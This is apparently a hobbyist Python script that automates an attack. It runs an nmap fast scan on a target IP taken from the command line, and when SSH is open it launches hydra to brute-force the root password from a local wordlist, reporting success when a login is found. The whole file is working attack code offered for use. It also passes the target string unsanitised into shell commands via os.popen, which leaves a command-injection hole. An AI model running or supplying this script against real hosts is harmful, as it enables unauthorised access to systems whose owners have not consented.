import os
import argparse
import re

def get_nmap(options, ip):
    num = [0, 0, 0]
    # [22port, 23port, 80port]
    # 0-closed, 1-open

    command = "nmap " +options + " "+ ip
    process = os.popen(command)
    results = str(process.read())
    r=results.split()
    del r[0:28:1]
    del r[-12:-1:1]
    r.pop()

    #for group in chunker(r, 3):
    #    print(group)
    #IP PORT SCAN INFORMATION
    
    if '22/tcp' in r:
        num[0] = 1
    if '23/tcp' in r:
        num[1] = 1
    if '80/tcp' in r:
        num[2] = 1
    if '81/tcp' in r:
        num[2] = 1

    return num


def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))



def hydra(ip, port):
    command = "hydra -l root -P /root/Desktop/dic.txt"+" "+ ip+" "+ port+" -V -f -t 4"
    process = os.popen(command)
    results = str(process.read())
    p = re.compile('')
    
    if "successfully" in results:
        print("Attack Succeess!!")
        

    else:
        print("Don't find")

    return results



#print(get_nmap(' -F', '172.30.1.40'))

parser = argparse.ArgumentParser()
parser.add_argument("-foo",help="python3 nmap.py -f <target IP>", required=True)
args = parser.parse_args()
foo = args.foo

#if args.ip:
print(get_nmap(' -F', foo))

#SSH PORT OPEN
if get_nmap(' -F', foo)[0]==1:
    print("SSH OPEN")
    print(hydra(foo,"ssh"))
    
